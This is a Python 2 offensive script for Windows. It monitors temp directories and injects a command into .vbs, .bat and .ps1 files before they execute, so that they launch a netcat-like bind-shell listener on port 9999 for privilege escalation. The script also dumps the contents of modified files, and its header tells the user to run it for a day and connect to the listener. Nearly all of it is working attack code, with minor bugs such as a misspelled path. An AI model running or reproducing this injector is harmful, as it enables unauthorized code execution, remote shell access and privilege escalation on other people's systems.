'''
Win race conditions!
Inject code before a file gets executed and then deleted.

Suggested Use:
* Run the script for 24 hours or longer.
* Connect to the listener spawned by our code injection with PyNet. 

Interesting bugs and information disclosures on top of potential privilege escalations will likely be reported.

V2 sends the output to a remote server.
'''

import tempfile
import threading
import win32file
import win32con
import os

# These are common temp file directories - modify at will
dirs_to_monitor = ["C:\\WINDOWS\\Temp", tempfile.gettempdir()]

# File modification constants
FILE_CREATED =      1
FILE_DELETED =      2
FILE_MODIFIED =     3
FILE_RENAMED_FROM = 4
FILE_RENAMED_TO =   5

# Dictionary of code snippets that match a particular file extension
file_types = {}

'''
Replace "command" as necessary.
In this scenario, we run "pynet.exe" which is an executable version of a Python script that is similar to Netcat.

If you replace the command, modify the file_types code snippers accordingly.
'''
command = "C:\\WINDOWS\\TEMPT\\pynet.exe -l -p 9999 -c"

file_types[".vbs"] = ["\r\n'pymarker\r\n", "\r\nCreateObject(\"Wscript.Shell\".Run(\"{}\")\r\n".format(command)]

file_types[".bat"] = ["\r\nREM pymarker\r\n", "\r\n{}\r\n".format(command)]

file_types[".ps1"] = ["\r\n#pymarker", "Start-Process \"{}\"\r\n".format(command)]

# Handle the code injection
def inject_code(full_filename, extension, contents):
	# Is our market already in the file?
	if file_types[extension][0] in contents:
		return

	# No marker; let us inject the marker and code
	full_contents = file_types[extension][0]
	full_contents += file_types[extension][1]
	full_contents += contents

	f = open(full_filename, "wb")
	f.write(full_contents)
	f.close()

	print "[+] Injected code."

	return


def start_monitor(path_to_watch):
	# Create a thread for each monitoring run
	FILE_LIST_DIRECTORY = 0x0001

	h_directory = win32file.CreateFile(
		path_to_watch,
		FILE_LIST_DIRECTORY,
		win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_SHARE_DELETE,
		None,
		win32con.OPEN_EXISTING,
		win32con.FILE_FLAG_BACKUP_SEMANTICS,
		None)

	while 1:
		try:
			results = win32file.ReadDirectoryChangesW(
				h_directory,
				1024,
				True,
				win32con.FILE_NOTIFY_CHANGE_FILE_NAME |
				win32con.FILE_NOTIFY_CHANGE_DIR_NAME |
				win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES |
				win32con.FILE_NOTIFY_CHANGE_SIZE |
				win32con.FILE_NOTIFY_CHANGE_LAST_WRITE |
				win32con.FILE_NOTIFY_CHANGE_SECURITY,
				None,
				None)

			for action, file_name in results:
				full_filename = os.path.join(path_to_watch, file_name)

				if action == FILE_CREATED:
					print "[+] Created: {}".format(full_filename)
				elif action == FILE_DELETED:
					print "[-] Deleted: {}".format(full_filename)
				elif action == FILE_MODIFIED:
					print "[*] Modified: {}".format(full_filename)

					# Dump put the file contents
					print "[...] Dumping contents..."
					try:
						fd = open(full_filename, "rb")
						contents = fd.read()
						fd.close()
						print contents
						print "[!!!] Dump complete."
					except:
						print "[!!!] Failed to dump contents."

					# Split file ext to compare against dictionary
					filename, extension = os.path.splitext(full_filename)
					# Inject code if the file ext is in our dictionary
					if extension in file_types:
						inject_code(full_filename, extension, contents)

				elif action == FILE_RENAMED_FROM:
					print "[>] Renamed from: {}".format(full_filename)
				elif action == FILE_RENAMED_TO:
					print "[<] Renamed to: {}".format(full_filename)
				else:
					print "[???] Unknown: {}".format(full_filename)

		except:
			pass

for path in dirs_to_monitor:
	monitor_thread = threading.Thread(target=start_monitor, args=(path,))
	print "[*] Spawning monitoring thread for path: {}".format(path)
	monitor_thread.start()

